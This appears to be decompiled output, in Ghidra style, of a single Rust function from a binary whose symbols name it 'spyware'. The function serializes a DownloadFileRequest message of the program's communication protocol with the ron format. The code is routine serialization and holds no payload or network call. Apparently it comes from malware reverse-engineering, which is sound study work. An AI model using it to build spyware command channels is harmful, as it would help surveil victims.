int * _ZN7spyware13communication8messages1_105__LT_impl_u20_serde__ser__Serialize_u20_for_u20_spyware__communication__messages__DownloadFileRequest_GT_9serialize17h54b8d5981f6378f4E
                (int *param_1,undefined8 param_2,undefined8 param_3)

{
  undefined8 local_50;
  undefined local_48;
  int local_40;
  int iStack_3c;
  undefined8 uStack_38;
  undefined local_30;
  undefined7 uStack_2f;
  undefined uStack_28;
  undefined7 uStack_27;
  undefined local_20;
  undefined7 uStack_1f;
  undefined8 uStack_18;
  
  _ZN84__LT__RF_mut_u20_ron__ser__Serializer_LT_W_GT__u20_as_u20_serde__ser__Serializer_GT_16serialize_struct17h19528d03ac3c512bE
            (&local_40,param_3,&DAT_001124ad,0x13,1);
  if (local_40 == 0x21) {
    local_50 = uStack_38;
    local_48 = local_30;
    _ZN75__LT_ron__ser__Compound_LT_W_GT__u20_as_u20_serde__ser__SerializeStruct_GT_15serialize_field17h0fe0e64abb5f6595E
              (&local_40,&local_50,&DAT_00111644,4,param_2);
    if (local_40 == 0x21) {
      _ZN75__LT_ron__ser__Compound_LT_W_GT__u20_as_u20_serde__ser__SerializeStruct_GT_3end17h1114ba35daa4ac40E
                (param_1,local_50,local_48);
    }
    else {
      *(ulong *)(param_1 + 8) = CONCAT71(uStack_1f,local_20);
      *(undefined8 *)(param_1 + 10) = uStack_18;
      *(ulong *)(param_1 + 4) = CONCAT71(uStack_2f,local_30);
      *(ulong *)(param_1 + 6) = CONCAT71(uStack_27,uStack_28);
      *(ulong *)param_1 = CONCAT44(iStack_3c,local_40);
      *(undefined8 *)(param_1 + 2) = uStack_38;
    }
  }
  else {
    *(ulong *)(param_1 + 8) = CONCAT71(uStack_1f,local_20);
    *(undefined8 *)(param_1 + 10) = uStack_18;
    *(ulong *)((long)param_1 + 0x11) = CONCAT17(uStack_28,uStack_2f);
    *(ulong *)((long)param_1 + 0x19) = CONCAT17(local_20,uStack_27);
    *param_1 = local_40;
    param_1[1] = iStack_3c;
    *(undefined8 *)(param_1 + 2) = uStack_38;
    *(undefined *)(param_1 + 4) = local_30;
  }
  return param_1;
}